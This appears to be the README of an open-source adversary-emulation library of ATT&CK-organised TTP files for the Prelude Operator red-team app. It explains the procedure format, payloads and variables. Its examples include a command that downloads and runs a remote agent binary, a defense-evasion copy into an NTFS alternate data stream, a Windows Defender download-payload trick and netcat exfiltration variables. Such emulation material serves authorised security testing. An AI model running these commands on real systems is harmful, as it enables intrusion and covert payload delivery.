# Community

Here you will find an open-source collection of TTP files, organized by ATT&CK tactic. Each procedure describes a single action an adversary
may attempt post-compromise of a network or system.

TTP files can be used on their own or within the Prelude Operator desktop app, where they are loaded by default on each restart.

## Understand the format

Take this example procedure. It supports three platforms (Windows, Darwin and Linux) and under each, it supports a handful of
executors: psh (PowerShell), cmd (command-line), and sh (bash).

```
id: 5a39d7ed-45c9-4a79-b581-e5fb99e24f65
metadata:
  version: 1
  authors:
    - privateducky
  tags: []
name: System processes
description: |
  Identify which processes are running on the local computer. This procedure is helpful to get a snapshot in time of
  what a computer is doing.
tactic: discovery
technique:
  id: T1057
  name: Process Discovery
platforms:
  windows:
    psh:
      command: Get-Process
    cmd:
      command: tasklist
  darwin:
    pwsh:
      command: Get-Process
    sh:
      command: ps aux
  linux:
    sh:
      command: ps aux
```

## Introducing payloads

Some executor blocks may include a payload property, such as:
```
sh:
  command: |
    chmod +x pneuma-darwin && nohup ./pneuma-darwin &
  payload: https://s3.amazonaws.com/operator.payloads/pneuma/pneuma-darwin
```
This procedure expects the payload (found at the HTTP address) to be downloaded to the target before executing the command. All Prelude agents do this by default.

## Introducing variables

Inside some commands, you will see variables, identified by a #{} syntax, such as:
```
copy #{file.T1005} #{directory.T1074}
```
The variables are meant to be replaced at runtime. In the Operator, this happens automatically but if you want to use
these files manually, you will need to fill in the desired values. The more variables you use, the more dynamic your operations will be.

Variables are either discoverable or automatic.

### Discoverable variables

Discoverable facts are those you anticipate a Prelude agent to find on its own. 

* **file**: references the absolute file path on disk
* **directory**: references the absolute path to a directory
* **ssh**: an ssh connection command
* **ip**: an ipv4 address
* **domain**: a valid domain and top-level domain (google.com)

When using discoverable variables inside commands, remember to place a dot separator with the technique ID you want the replaced
variable (fact) to come from. For example, the following variable will be replaced with each file found by running
a T1005 procedure:
```
#{file.T1005}
```

Prelude Operator parses the results from every run command, attempting to learn <i>facts</i> - which automatically fill in variables - unlocking additional procedures for execution.

### Automatic variables

Automatic facts are environmental and are applied to an agent based on conditional logic.

* **operator.session**: a unique key for your Operator session. The session key regenerates on each restart of the app and is used internally to help validate external connections originated in the app.
* **operator.http**: callback address of your HTTP server
* **agent.name**: current name given to the agent
* **agent.location**: absolute file path of the agent file on disk

### Custom variables

Custom facts are user defined facts that can be arbitrarily defined. In general, follow the outline of `<ATT&CK Tactic>.<general description>` when defining these facts.

Example for defining a custom NetCat listening post:
* **exfiltration.netcat.ip**: IP address of the NetCat listener
* **exfiltration.netcat.port**: Port NetCat is listening on that server

### Tactic variable language

We are investigating the implementation of an abstraction layer on top of the discoverable variables in order to create a more 
powerful language during automated planning. This is an extension of the Custom variables that formalizes a structure for referring
to local and remote objects, components of those objects, and detailing metadata relevant to the object. These variables still
work as standard custom variables (and you can populate them manually to use the TTPs). Additionally, the concept of these variables
will incorporate a time and state transition. To better understand this, let's take a look at few commands and use cases.

#### Local file copy example
```yaml
name: Copy files with Esenutl in ADSs
description: |
  Binary for working with Microsoft Joint Engine Technology (JET) database that allows local and remote file copying.
platforms:
  windows:
    exec:
      command: 'esentutl.exe /y #{defense-evasion.local.existing.file} /d #{defense-evasion.local.new.file.ads} /o'
```
This command uses the new `exec` executor in pnuemaEX to copy a file using built-in `esentutl.exe` binary on a windows platform.
So let's break down these variables:
* `defense-evasion.local.existing.file`
  * `defense-evasion`: MITRE attack tactic of the TTP
  * `local`: object is on this local system. Defines whether this object exists on the system where the agent is running or is it on remote system (`local` or `remote` are valid)
  * `existing`: object already exists on the local system. Defines whether the object describe already exists on the system or if it is a new object (`existing` or `new`)
  * `file`: object type is a file. Defines the object type (and other potential additional data about the type)
* `defense-evasion.local.new.file.ads`
  * `defense-evasion`: MITRE attack tactic of the TTP
  * `local`: object is on this local system. Defines whether this object exists on the system where the agent is running or is it on remote system (`local` or `remote` are valid)
  * `new`: new object that doesn't exist on target. Defines whether the object describe already exists on the system or if it is a new object (`existing` or `new`)
  * `file`: object type is a file. Defines the object type (and other potential additional data about the type)
  * `ads`: file object is an NTFS ADS file (test.txt:test.exe). Defines a more specific typing for the file.
    
Looking at the command, we can read this as: 
* For a defense-evasion step, I want to use `esentutl.exe` to do a copy of a local existing file to a new local file ADS stream.

#### Remote file download example

The syntax for remote is slightly different, as we cannot know for certain whether the object exists on the remote system.

```yaml
name: Download payload with Windows Defender
description: |
  Use windows defender command line utility to download a payload onto the system.
platforms:
  windows:
    exec:
      command: 'MpCmdRun.exe -DownloadFile -url #{defense-evasion.remote.http.file} -path #{defense-evasion.local.new.file.ads}'
```
This command uses the new `exec` executor in pnuemaEX to ingress a tool using built-in `MpCmdRun.exe` binary on a windows platform.
So let's break down these variables:
* `defense-evasion.remote.http.file`
  * `defense-evasion`: MITRE attack tactic of the TTP
  * `remote`: object is on this remote system
  * `http`: object is avaiable via HTTP/S protocol. This could also be `webdav`, `share`, or other types of remote file definitions
  * `file`: object type is a file



#### Experimental research

This is all experimental and not implement in the production code, it is just getting ideas out there:

The goal of this overall approach would be Operator will translate `discoverable` variables into `tactic` variables for discrete
atomic actions that don't make "forward progress". An idea (not the answer, this is experimental) of what this would look like in practice is:
* Operator has 2 TTPs, one of which produces a `file.T1105` fact (ingressed a new tool), and another TTP that would want to try to execute a `file.T1564.004` fact because it is an executable stored in an ADS stream.
* Operator maps `file.T1105` to `defense-evasion.local.existing.file`, generates a `defense-evasion.local.new.file.ads` dynamically 
  for the target, then executes the copy command. 
* If the copy is successful, then the `defense-evasion.local.new.file.ads` becomes a `defense-evasion.local.existing.file.ads` object that can be
  translated into a `file.T1564.004` fact
* Operator resumes planning as normal, with access to a `file.T1564.004` fact

## CALDERA inspired

As former CALDERA leads, this project was originally forked and designed off of the MITRE Stockpile repository.

## Interested in contributing?

We strongly support contributors to this project. Please fork this repo and submit pull requests for considerations.
